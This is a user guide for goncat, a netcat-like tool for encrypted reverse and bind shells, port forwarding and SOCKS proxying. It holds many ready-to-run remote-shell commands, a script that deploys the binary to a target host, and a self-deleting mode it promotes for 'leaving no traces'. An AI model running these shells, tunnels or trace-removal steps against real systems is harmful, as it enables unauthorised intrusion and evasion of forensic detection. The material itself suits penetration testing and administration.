# Usage Guide

> Comprehensive user guide for **goncat**, a netcat-like tool for secure remote shells and tunneling. Last updated: 2025-10-23, commit `bc7e6e8`.

## What is goncat?

**goncat** is a cross-platform command-line tool that creates secure bind or reverse shells with an SSH-like experience. Unlike traditional netcat, goncat provides:

- **Encrypted connections** with TLS and optional password-based mutual authentication
- **Interactive shells** with full pseudo-terminal (PTY) support on Linux, Windows, and macOS
- **Port forwarding** (local and remote) and SOCKS5 proxy capabilities for tunneling
- **Session logging** to record your shell sessions
- **Automatic cleanup** to remove the binary after execution

**Who is this for?** System administrators, penetration testers, security researchers, and anyone who needs secure remote shell access or tunneling without SSH infrastructure.

## Quick Start

The fastest way to get started with goncat:

1. **Build the binary** (requires Go 1.23+):
   ```bash
   git clone https://github.com/DominicBreuker/goncat.git
   cd goncat
   make build-linux    # For Linux (creates dist/goncat.elf)
   # OR
   make build-windows  # For Windows (creates dist/goncat.exe)
   make build-darwin   # For macOS (creates dist/goncat.macho)
   ```

2. **Run your first reverse shell**:
   
   On your machine (master):
   ```bash
   ./dist/goncat.elf master listen 'tcp://*:12345' --exec /bin/sh
   ```
   
   On the remote machine (slave):
   ```bash
   ./dist/goncat.elf slave connect tcp://YOUR_IP:12345
   ```

3. **See all available commands**:
   ```bash
   ./dist/goncat.elf --help
   ./dist/goncat.elf master --help
   ./dist/goncat.elf slave --help
   ```

## Installation & Requirements

### System Requirements

- **Operating Systems**: Linux, Windows, macOS
- **Go version**: 1.23 or higher (only for building from source)
- **Runtime dependencies**: None (statically compiled binaries)

### Building from Source

goncat must currently be built from source as pre-built binaries are not yet available (the project is in alpha):

```bash
# Clone the repository
git clone https://github.com/DominicBreuker/goncat.git
cd goncat

# Build for your platform
make build-linux    # Linux → dist/goncat.elf
make build-windows  # Windows → dist/goncat.exe
make build-darwin   # macOS → dist/goncat.macho

# Or build all platforms at once
make build
```

**Build time**: ~11 seconds for Linux, ~30-40 seconds for all platforms.

**Binary sizes**: Each binary is approximately 9-10 MB after symbol stripping.

### Installing the Binary

After building, copy the binary to a directory in your PATH:

```bash
# Linux/macOS
sudo cp dist/goncat.elf /usr/local/bin/goncat
# OR for user-only install
mkdir -p ~/bin
cp dist/goncat.elf ~/bin/goncat

# Windows
copy dist\goncat.exe C:\Windows\System32\goncat.exe
```

## Core Concepts

Before diving into usage, understand these key concepts:

### Master vs Slave

- **Master**: The controlling side that specifies connection parameters (what program to execute, whether to use PTY, logging, port forwarding)
- **Slave**: The executing side that follows the master's instructions
- **Important**: Master/slave roles are independent of client/server (listen/connect) roles

### Listen vs Connect

- **Listen**: Creates a server socket and waits for incoming connections
- **Connect**: Acts as a client and connects to a remote listener

### Four Operation Modes

goncat supports four combinations of master/slave and listen/connect:

1. **Master Listen** (`goncat master listen`): You listen and wait for a slave to connect (reverse shell)
2. **Master Connect** (`goncat master connect`): You connect to a listening slave (bind shell)
3. **Slave Listen** (`goncat slave listen`): Remote machine listens for your master connection (bind shell)
4. **Slave Connect** (`goncat slave connect`): Remote machine connects to your master listener (reverse shell)

### Transport Protocols

goncat supports four transport protocols:

- **tcp**: Plain TCP connections (`tcp://host:port`)
- **ws**: WebSocket connections (`ws://host:port`)
- **wss**: WebSocket Secure connections with TLS (`wss://host:port`)
- **udp**: UDP connections with QUIC for reliability (`udp://host:port`)

Format: `protocol://host:port`
- When listening, you can use `*` as the host to bind to all interfaces: `tcp://*:12345`
- When connecting, specify the target IP or hostname: `tcp://192.168.1.100:12345`

**UDP Transport Notes**:
- UDP transport uses QUIC protocol for reliable, ordered byte streams over UDP
- TLS 1.3 encryption is built into QUIC (mandatory)
- Works with all goncat features: --ssl, --key, --pty, port forwarding, SOCKS proxy
- Connection establishment is as fast as TCP (~10-15ms on localhost)

## Configuration

goncat is configured entirely through command-line flags. There are no configuration files or environment variables.

### Common Flags (Available in All Modes)

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--ssl` | `-s` | Enable TLS encryption | `false` |
| `--key <password>` | `-k` | Password for mutual TLS authentication (requires `--ssl`) | none |
| `--timeout <ms>` | `-t` | Operation timeout in milliseconds | `10000` (10s) |
| `--verbose` | `-v` | Enable verbose error logging | `false` |

### Master-Specific Flags

These flags are only available in master mode (`goncat master listen/connect`):

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--exec <program>` | `-e` | Execute a program on the slave | none |
| `--pty` | | Enable pseudo-terminal mode for interactive shells | `false` |
| `--log <file>` | `-l` | Log session to a file | none |
| `--local <spec>` | `-L` | Local port forwarding (see Port Forwarding) | none |
| `--remote <spec>` | `-R` | Remote port forwarding (see Port Forwarding) | none |
| `--socks <address>` | `-D` | SOCKS proxy (see SOCKS Proxy) | none |

### Slave-Specific Flags

These flags are only available in slave mode (`goncat slave listen/connect`):

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--cleanup` | `-c` | Delete the binary after execution | `false` |

## Authentication & Security

### Encryption with TLS

Enable encryption by adding `--ssl` to both master and slave:

```bash
# Master
goncat master listen 'tcp://*:12345' --ssl --exec /bin/sh

# Slave
goncat slave connect tcp://YOUR_IP:12345 --ssl
```

**How it works**: goncat generates ephemeral TLS certificates on each run. The server generates a certificate, and the client accepts any certificate without validation (similar to `ssh -o StrictHostKeyChecking=no`).

### Mutual Authentication

Add password-based mutual authentication with `--key`:

```bash
# Master
goncat master listen 'tcp://*:12345' --ssl --key mypassword --exec /bin/sh

# Slave
goncat slave connect tcp://YOUR_IP:12345 --ssl --key mypassword
```

**How it works**: The password is used as a seed for deterministic certificate generation. Both sides generate and validate certificates using the same password. This prevents unauthorized clients from connecting.

**Security considerations**:
- Use a strong, unique password for each session
- `--key` requires `--ssl` to be enabled
- Passwords are never transmitted over the network
- Certificates are ephemeral and regenerated on each run

## Frequently Used Commands

### Check Version

```bash
goncat version
# Output: 0.0.1
```

### Create a Reverse Shell

Master listens, slave connects:

```bash
# On your machine (master)
goncat master listen 'tcp://*:12345' --exec /bin/sh

# On remote machine (slave)
goncat slave connect tcp://192.168.1.100:12345
```

### Create a Bind Shell

Slave listens, master connects:

```bash
# On remote machine (slave)
goncat slave listen 'tcp://*:12345'

# On your machine (master)
goncat master connect tcp://192.168.1.200:12345 --exec /bin/sh
```

### Interactive Shell with PTY

For a fully interactive shell (with tab completion, arrow keys, etc.):

```bash
# Master
goncat master listen 'tcp://*:12345' --exec /bin/bash --pty

# Slave
goncat slave connect tcp://192.168.1.100:12345
```

**Note**: Always use `--pty` with a shell program (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) for the best experience.

### Secure Connection with Authentication

```bash
# Master
goncat master listen 'tcp://*:12345' --ssl --key secretpassword --exec /bin/sh

# Slave
goncat slave connect tcp://192.168.1.100:12345 --ssl --key secretpassword
```

### With Session Logging

```bash
# Master
goncat master listen 'tcp://*:12345' --exec /bin/sh --log /tmp/session.log

# Slave
goncat slave connect tcp://192.168.1.100:12345
```

### Self-Deleting Slave

Useful for leaving no traces:

```bash
# Slave (will delete itself after the connection ends)
goncat slave connect tcp://192.168.1.100:12345 --cleanup
```

## Features

### Pseudo-Terminal (PTY) Support

Enable with `--pty` on the master side for fully interactive shells:

```bash
goncat master listen 'tcp://*:12345' --exec /bin/bash --pty
```

**Benefits**:
- Full terminal support (arrow keys, tab completion, text editors)
- Automatic terminal size synchronization
- Works cross-platform (Linux, Windows, macOS)

**Note**: PTY is a master-side flag. Always combine with `--exec` to specify a shell.

### Port Forwarding

goncat supports both TCP and UDP port forwarding. Use the protocol prefix (`T:` or `U:`) to specify the protocol explicitly.

#### Local Port Forwarding

Opens a port on the **master** side that forwards connections through the slave:

```bash
# TCP forwarding (implicit - backward compatible)
goncat master listen 'tcp://*:12345' --exec /bin/sh -L 8443:google.com:443
goncat master listen 'tcp://*:12345' --exec /bin/sh -L localhost:8080:192.168.1.50:80

# Explicit TCP forwarding
goncat master listen 'tcp://*:12345' --exec /bin/sh -L T:8080:web-server:80

# UDP forwarding (new!)
goncat master listen 'tcp://*:12345' --exec /bin/sh -L U:5353:dns-server:53
```

**Use case**: Access services on the slave's network from your master machine.

**Example**: If the slave can reach an internal web server at `192.168.1.50:80`, you can access it via `http://localhost:8080` on your master.

#### Remote Port Forwarding

Opens a port on the **slave** side that forwards connections through the master:

```bash
# TCP forwarding (implicit)
goncat master listen 'tcp://*:12345' --exec /bin/sh -R 8080:localhost:80
goncat master listen 'tcp://*:12345' --exec /bin/sh -R 0.0.0.0:9000:192.168.1.10:3000

# Explicit UDP forwarding
goncat master listen 'tcp://*:12345' --exec /bin/sh -R U:8080:localhost:9000
```

**Use case**: Expose services on the master's network to the slave.

**Example**: Expose your local web server at `localhost:80` to the slave at port `8080`.

#### Multiple Port Forwards (Mixed Protocols)

You can specify multiple port forwards with different protocols:

```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh \
  -L T:8080:internal-app:80 \
  -L U:5353:dns-server:53 \
  -L 5432:database:5432 \
  -R U:9090:localhost:8000
```

#### UDP Port Forwarding Details

For comprehensive examples and troubleshooting information about UDP port forwarding, see [UDP Port Forwarding Examples](examples/udp-port-forwarding.md).

**Key points**:
- Protocol prefix is case-insensitive (`U:` or `u:`, `T:` or `t:`)
- UDP sessions are tracked per client address and automatically cleaned up after inactivity
- Use `--timeout` flag to control UDP session lifetime (default: 60s)

### SOCKS Proxy

Create a SOCKS5 proxy to tunnel traffic through the slave:

```bash
# Format: -D [local-host:]<local-port>
# Default local-host is 127.0.0.1
goncat master listen 'tcp://*:12345' --exec /bin/sh -D 1080
goncat master listen 'tcp://*:12345' --exec /bin/sh -D 127.0.0.1:1080

# Listen on all interfaces
goncat master listen 'tcp://*:12345' --exec /bin/sh -D :1080
```

**Supported**: TCP CONNECT and UDP ASSOCIATE (no authentication)

**Use case**: Route browser traffic or other applications through the slave's network.

**Example with curl**:
```bash
# After setting up SOCKS proxy on port 1080
curl --socks5 127.0.0.1:1080 http://internal-service
```

### Session Logging

Record all session activity to a file:

```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh --log /tmp/session.log
```

**What's logged**: All bytes sent over the main channel (what you see on screen). Control messages for PTY size synchronization are not logged.

**Note**: Logs may appear somewhat garbled when PTY is enabled due to terminal control sequences.

### Automatic Cleanup

Make the slave delete itself after execution:

```bash
goncat slave connect tcp://192.168.1.100:12345 --cleanup
```

**How it works**:
- **Linux**: The binary can delete itself directly (most systems allow this)
- **Windows**: Launches a separate CMD process that waits 5 seconds and then deletes the binary

**Use case**: Penetration testing and security assessments where you want to minimize forensic traces.

### Transport Protocol Options

goncat supports four transport protocols:

#### Plain TCP
```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh
goncat slave connect tcp://192.168.1.100:12345
```

**Best for**: Direct connections, maximum compatibility.

#### WebSocket (ws)
```bash
goncat master listen 'ws://*:8080' --exec /bin/sh
goncat slave connect ws://192.168.1.100:8080
```

**Best for**: Environments where TCP might be blocked but HTTP is allowed.

#### WebSocket Secure (wss)
```bash
goncat master listen 'wss://*:8443' --exec /bin/sh
goncat slave connect wss://192.168.1.100:8443
```

**Best for**: WebSocket with TLS encryption (ephemeral certificates generated automatically).

#### UDP with QUIC
```bash
goncat master listen 'udp://*:12345' --exec /bin/sh
goncat slave connect udp://192.168.1.100:12345
```

**Best for**: Environments where UDP is preferred or required. QUIC provides reliable, ordered streaming over UDP with built-in TLS 1.3 encryption.

**Note**: 
- UDP transport uses the QUIC protocol for reliability (similar to TCP but over UDP)
- TLS 1.3 encryption is mandatory and built into QUIC
- Works with all goncat features: --ssl, --key, --pty, port forwarding, SOCKS proxy
- Performance is comparable to TCP on local networks

**Note**: When using `--ssl` flag with any protocol, TLS encryption is applied. For `wss://` and `udp://`, encryption is built into the protocol.

## Examples

### Basic Examples

#### Simple Reverse Shell (No Encryption)

```bash
# Master (your machine) - listens on all interfaces, port 12345
goncat master listen 'tcp://*:12345' --exec /bin/sh

# Slave (remote machine) - connects back to you
goncat slave connect tcp://192.168.1.100:12345
```

**Expected**: You get a shell prompt from the remote machine.

#### Bind Shell on Remote Machine

```bash
# Slave (remote machine) - listens on port 12345
goncat slave listen 'tcp://*:12345'

# Master (your machine) - connects and requests /bin/sh
goncat master connect tcp://192.168.1.200:12345 --exec /bin/sh
```

**Expected**: You get a shell prompt from the remote machine.

#### Interactive Shell with PTY

```bash
# Master
goncat master listen 'tcp://*:12345' --exec /bin/bash --pty

# Slave
goncat slave connect tcp://192.168.1.100:12345
```

**Expected**: Fully interactive bash shell with tab completion, arrow keys, etc.

### Secure Connection Examples

#### Encrypted Connection

```bash
# Master
goncat master listen 'tcp://*:12345' --ssl --exec /bin/sh

# Slave
goncat slave connect tcp://192.168.1.100:12345 --ssl
```

**Expected**: Encrypted shell connection (TLS).

#### Encrypted with Password Authentication

```bash
# Master
goncat master listen 'tcp://*:12345' --ssl --key S3cureP@ssw0rd --exec /bin/bash --pty

# Slave
goncat slave connect tcp://192.168.1.100:12345 --ssl --key S3cureP@ssw0rd
```

**Expected**: Only slaves with the correct password can connect.

### Port Forwarding Examples

#### Access Internal Web Server

Slave can reach internal server at `192.168.10.50:80`, you want to access it from your master:

```bash
# Master (opens local port 8080)
goncat master listen 'tcp://*:12345' --exec /bin/sh -L 8080:192.168.10.50:80

# Slave
goncat slave connect tcp://192.168.1.100:12345

# On master, in another terminal
curl http://localhost:8080
```

**Expected**: You access the internal web server through the tunnel.

#### Expose Your Local Service to Remote Network

You have a web server on `localhost:80`, want slave to access it on port `8080`:

```bash
# Master (opens port 8080 on slave)
goncat master listen 'tcp://*:12345' --exec /bin/sh -R 8080:localhost:80

# Slave
goncat slave connect tcp://192.168.1.100:12345

# On slave machine, in another terminal
curl http://localhost:8080
```

**Expected**: Slave can access your local web server.

#### Multiple Port Forwards

```bash
# Master - forward multiple services
goncat master listen 'tcp://*:12345' --exec /bin/sh \
  -L 3306:database.internal:3306 \
  -L 6379:redis.internal:6379 \
  -R 8000:localhost:8000

# Slave
goncat slave connect tcp://192.168.1.100:12345
```

**Expected**: Master can access database and Redis on slave's network; slave can access master's service on port 8000.

### SOCKS Proxy Examples

#### Browse Through Slave's Network

```bash
# Master (creates SOCKS proxy on port 1080)
goncat master listen 'tcp://*:12345' --exec /bin/sh -D 1080

# Slave
goncat slave connect tcp://192.168.1.100:12345

# Configure browser or curl to use SOCKS proxy
curl --socks5 127.0.0.1:1080 http://internal.website
```

**Expected**: HTTP requests go through the slave's network connection.

#### SOCKS with UDP Support

```bash
# Master
goncat master listen 'tcp://*:12345' --exec /bin/sh -D 1080

# Slave
goncat slave connect tcp://192.168.1.100:12345

# Use SOCKS proxy for DNS resolution (UDP)
dig @127.0.0.1 -p 1080 internal.domain
```

**Expected**: UDP DNS queries are tunneled through the SOCKS proxy (UDP ASSOCIATE support).

### Advanced Examples

#### WebSocket Reverse Shell

```bash
# Master
goncat master listen 'ws://*:8080' --exec /bin/bash --pty

# Slave
goncat slave connect ws://192.168.1.100:8080
```

**Expected**: Interactive shell over WebSocket protocol.

#### Secure WebSocket with Authentication

```bash
# Master
goncat master listen 'wss://*:8443' --key mypassword --exec /bin/sh

# Slave
goncat slave connect wss://192.168.1.100:8443 --key mypassword
```

**Expected**: Encrypted WebSocket with password authentication.

#### Session Logging and Cleanup

```bash
# Master (logs session to file)
goncat master listen 'tcp://*:12345' --ssl --exec /bin/sh --log /tmp/audit.log

# Slave (deletes itself after connection ends)
goncat slave connect tcp://192.168.1.100:12345 --ssl --cleanup
```

**Expected**: Session is logged to `/tmp/audit.log` on master; slave binary is deleted after execution.

#### Increased Timeout for Slow Connections

```bash
# Master (30 second timeout)
goncat master listen 'tcp://*:12345' --timeout 30000 --ssl --exec /bin/sh

# Slave
goncat slave connect tcp://192.168.1.100:12345 --timeout 30000 --ssl
```

**Expected**: TLS handshake and mux operations won't timeout for 30 seconds.

### Windows-Specific Examples

#### Windows Reverse Shell with CMD

```bash
# Master (Linux/macOS)
goncat master listen 'tcp://*:12345' --exec cmd.exe --pty

# Slave (Windows)
goncat.exe slave connect tcp://192.168.1.100:12345
```

**Expected**: Windows command prompt over the connection.

#### Windows Reverse Shell with PowerShell

```bash
# Master (Linux/macOS)
goncat master listen 'tcp://*:12345' --exec powershell.exe --pty

# Slave (Windows)
goncat.exe slave connect tcp://192.168.1.100:12345
```

**Expected**: Interactive PowerShell over the connection.

### Scripting Examples

#### Automated Deployment

```bash
#!/bin/bash
# deploy-slave.sh - Deploy and run goncat slave

TARGET_HOST="192.168.1.200"
TARGET_PORT="22"
MASTER_IP="192.168.1.100"
MASTER_PORT="12345"

# Copy binary to target
scp dist/goncat.elf user@$TARGET_HOST:/tmp/goncat

# Execute slave with cleanup
ssh user@$TARGET_HOST "/tmp/goncat slave connect tcp://$MASTER_IP:$MASTER_PORT --cleanup"
```

#### Master with Error Handling

```bash
#!/bin/bash
# master-listen.sh - Start master with logging

LOG_DIR="/var/log/goncat"
mkdir -p "$LOG_DIR"

SESSION_LOG="$LOG_DIR/session-$(date +%Y%m%d-%H%M%S).log"

if ! goncat master listen 'tcp://*:12345' \
    --ssl --key "$GONCAT_KEY" \
    --exec /bin/bash --pty \
    --log "$SESSION_LOG" \
    --timeout 20000 \
    --verbose; then
    echo "goncat failed with exit code $?"
    exit 1
fi
```

## Output, Exit Codes & Logging

### Standard Output

- **Interactive mode** (with `--pty`): All output goes directly to your terminal
- **Non-PTY mode**: Output is printed as received from the slave
- **Verbose mode** (`--verbose`): Error messages and debug information are printed to stderr

### Exit Codes

- **0**: Successful execution and clean exit
- **Non-zero**: Error occurred (connection failed, TLS handshake failed, program execution error, etc.)

**Example**:
```bash
goncat slave connect tcp://192.168.1.100:12345
echo $?  # Check exit code
```

### Session Logging

When `--log` is specified, all session data (main channel) is written to the specified file:

```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh --log /tmp/session.log
```

**Log format**: Raw bytes as transmitted over the connection
**Note**: Logs may contain terminal control sequences when `--pty` is enabled

### Verbose Logging

Enable verbose error logging with `--verbose`:

```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh --verbose
```

**Output**: Detailed error messages and stack traces to help debug connection issues.

## Troubleshooting & FAQ

### Common Issues

#### "command not found" Error

**Problem**: Shell can't find the `goncat` binary.

**Solution**: Ensure the binary is in your PATH or use the full path:
```bash
./dist/goncat.elf master listen 'tcp://*:12345' --exec /bin/sh
# OR
/usr/local/bin/goncat master listen 'tcp://*:12345' --exec /bin/sh
```

#### Connection Refused

**Problem**: Slave can't connect to master (or vice versa).

**Possible causes**:
1. Firewall blocking the port
2. Wrong IP address or port
3. Master not listening yet when slave tries to connect

**Solutions**:
```bash
# Check if port is listening
netstat -tlnp | grep 12345  # Linux
netstat -an | findstr 12345  # Windows

# Disable firewall temporarily (testing only)
sudo ufw disable  # Linux
```

#### TLS Handshake Timeout

**Problem**: Connection times out during TLS handshake.

**Solutions**:
```bash
# Increase timeout (default is 10 seconds)
goncat master listen 'tcp://*:12345' --ssl --timeout 30000 --exec /bin/sh
goncat slave connect tcp://192.168.1.100:12345 --ssl --timeout 30000
```

#### Authentication Failed (Wrong Password)

**Problem**: Slave can't authenticate with master.

**Symptom**: Connection immediately closes after TLS handshake.

**Solution**: Ensure both sides use the same `--key` value:
```bash
# Both must match exactly
goncat master listen 'tcp://*:12345' --ssl --key mypassword --exec /bin/sh
goncat slave connect tcp://192.168.1.100:12345 --ssl --key mypassword
```

#### PTY Not Working

**Problem**: Shell doesn't respond to arrow keys or tab completion.

**Solutions**:
1. Ensure `--pty` is specified on master side
2. Make sure you're executing a shell with `--exec /bin/bash`
3. Try running without `--pty` first to see if basic connection works

```bash
# Correct PTY usage
goncat master listen 'tcp://*:12345' --exec /bin/bash --pty
```

#### Port Already in Use

**Problem**: Can't listen because port is already bound.

**Solution**: Choose a different port or kill the process using it:
```bash
# Find process using port
lsof -i :12345  # Linux/macOS
netstat -ano | findstr 12345  # Windows

# Kill process
kill -9 <PID>  # Linux/macOS
taskkill /F /PID <PID>  # Windows
```

#### Slave Cleanup Failed (Windows)

**Problem**: Binary is still present after using `--cleanup` on Windows.

**Explanation**: Windows doesn't allow a running process to delete itself. goncat uses a workaround (CMD batch file) that waits 5 seconds.

**Workaround**: Wait a few seconds after the process exits, or manually delete the file.

### Frequently Asked Questions

#### Can I use goncat without building from source?

Currently no. The project is in alpha and pre-built binaries are not yet available. You must build from source using `make build`.

#### Do I need Go installed on the target machine?

No. The compiled goncat binaries are statically linked and have no runtime dependencies. Just copy the binary to the target machine.

#### Can I run multiple goncat sessions simultaneously?

Yes, just use different ports:
```bash
# Session 1
goncat master listen 'tcp://*:12345' --exec /bin/sh

# Session 2 (different port)
goncat master listen 'tcp://*:12346' --exec /bin/bash --pty
```

#### How secure is goncat's encryption?

goncat uses TLS with ephemeral certificates:
- Encryption: Strong (TLS)
- Certificate validation: None (similar to SSH without StrictHostKeyChecking)
- Authentication: Password-based mutual certificate verification when `--key` is used

For production use, consider using proper certificate infrastructure.

#### Does goncat work through NAT/firewalls?

Yes, with appropriate port forwarding:
- **Reverse shell** (master listen, slave connect): Requires master's port to be accessible
- **Bind shell** (slave listen, master connect): Requires slave's port to be accessible

Use reverse shell mode if only the master can receive incoming connections.

#### Can I tunnel VPN traffic through goncat?

Yes, using the SOCKS proxy feature:
```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh -D 1080
# Configure VPN client to use SOCKS5 proxy at 127.0.0.1:1080
```

#### What's the difference between ws and wss?

- **ws**: WebSocket over plain HTTP
- **wss**: WebSocket over HTTPS (includes TLS encryption)
- **tcp with --ssl**: Plain TCP wrapped in TLS

Use `wss://` when you need WebSocket protocol with encryption, or use `ws://` with `--ssl` flag for similar effect.

#### Can I redirect output to a file?

Yes, use standard shell redirection:
```bash
goncat master connect tcp://192.168.1.200:12345 --exec "ls -la" > output.txt
```

Or use the `--log` flag for session logging:
```bash
goncat master listen 'tcp://*:12345' --exec /bin/sh --log session.log
```

## Compatibility & Platform Notes

### Linux

- **Fully supported**: All features work as expected
- **PTY**: Native PTY support using `/dev/ptmx`
- **Cleanup**: Binary can delete itself directly
- **Shells**: `/bin/sh`, `/bin/bash`, `/bin/zsh`, etc.

### Windows

- **Fully supported**: All features work with some platform differences
- **PTY**: Uses Windows ConPTY API (Windows 10 1809+)
- **Cleanup**: Uses CMD batch script with 5-second delay
- **Shells**: `cmd.exe`, `powershell.exe`

**Windows-specific notes**:
- PTY requires Windows 10 version 1809 or later
- Use `cmd.exe` or `powershell.exe` as the shell
- Backslashes in paths: `C:\Windows\System32\cmd.exe`

### macOS

- **Fully supported**: All features work as expected
- **PTY**: Native PTY support using `/dev/ptmx`
- **Cleanup**: Binary can delete itself directly
- **Shells**: `/bin/sh`, `/bin/bash`, `/bin/zsh`, etc.

**macOS-specific notes**:
- Default shell is `zsh` on modern macOS versions
- May need to allow incoming connections in macOS firewall

### Binary Compatibility

- **Go version**: Built with Go 1.23+
- **Static compilation**: No external dependencies required
- **CGO**: Disabled (CGO_ENABLED=0) for full portability
- **Architectures**: Currently supports amd64 (x86_64)

## Privacy & Telemetry

goncat **does not collect any telemetry or analytics**. All data stays on your machines:

- No network connections except those explicitly created by you
- No external API calls or phone-home functionality
- Session logs are only created when you specify `--log`
- All certificates are generated locally and are ephemeral

## Where to Get Help

### Documentation

- **README**: [`README.md`](../README.md) - Overview and getting started
- **Architecture**: [`docs/ARCHITECTURE.md`](ARCHITECTURE.md) - System design and code organization
- **Testing Guide**: [`TESTING.md`](../TESTING.md) - For developers working on the codebase

### Reporting Issues

If you encounter bugs or have feature requests:

1. Check existing issues: https://github.com/DominicBreuker/goncat/issues
2. Create a new issue with:
   - goncat version (`goncat version`)
   - Operating system and version
   - Full command you ran
   - Error messages (use `--verbose` for details)
   - Expected vs actual behavior

### Development

goncat is open source under the GPL v3 license. See [`LICENSE`](../LICENSE) for details.

**Repository**: https://github.com/DominicBreuker/goncat

## Quick Reference

### Command Structure

```
goncat <master|slave> <listen|connect> <transport> [flags]
```

### Transport Format

```
tcp://<host>:<port>   # Plain TCP
ws://<host>:<port>    # WebSocket
wss://<host>:<port>   # WebSocket Secure
```

### Common Command Patterns

```bash
# Reverse shell (most common)
goncat master listen 'tcp://*:PORT' --exec /bin/sh
goncat slave connect tcp://MASTER_IP:PORT

# Bind shell
goncat slave listen 'tcp://*:PORT'
goncat master connect tcp://SLAVE_IP:PORT --exec /bin/sh

# Interactive PTY shell
goncat master listen 'tcp://*:PORT' --exec /bin/bash --pty

# Encrypted with authentication
goncat master listen 'tcp://*:PORT' --ssl --key PASSWORD --exec /bin/sh
goncat slave connect tcp://MASTER_IP:PORT --ssl --key PASSWORD

# Port forwarding
goncat master listen 'tcp://*:PORT' --exec /bin/sh -L LOCAL:REMOTE
goncat master listen 'tcp://*:PORT' --exec /bin/sh -R REMOTE:LOCAL

# SOCKS proxy
goncat master listen 'tcp://*:PORT' --exec /bin/sh -D 1080
```

### Flag Quick Reference

| Flag | Shorthand | Master | Slave | Description |
|------|-----------|--------|-------|-------------|
| `--ssl` | `-s` | ✓ | ✓ | Enable TLS encryption |
| `--key` | `-k` | ✓ | ✓ | Password for mutual authentication |
| `--verbose` | `-v` | ✓ | ✓ | Verbose error logging |
| `--timeout` | `-t` | ✓ | ✓ | Timeout in milliseconds |
| `--exec` | `-e` | ✓ | ✗ | Program to execute |
| `--pty` | | ✓ | ✗ | Enable PTY mode |
| `--log` | `-l` | ✓ | ✗ | Session log file |
| `--local` | `-L` | ✓ | ✗ | Local port forwarding |
| `--remote` | `-R` | ✓ | ✗ | Remote port forwarding |
| `--socks` | `-D` | ✓ | ✗ | SOCKS proxy |
| `--cleanup` | `-c` | ✗ | ✓ | Delete binary after run |

---

*This documentation was generated from commit `bc7e6e8` on `2025-10-23`. For the latest updates, see the [goncat repository](https://github.com/DominicBreuker/goncat).*
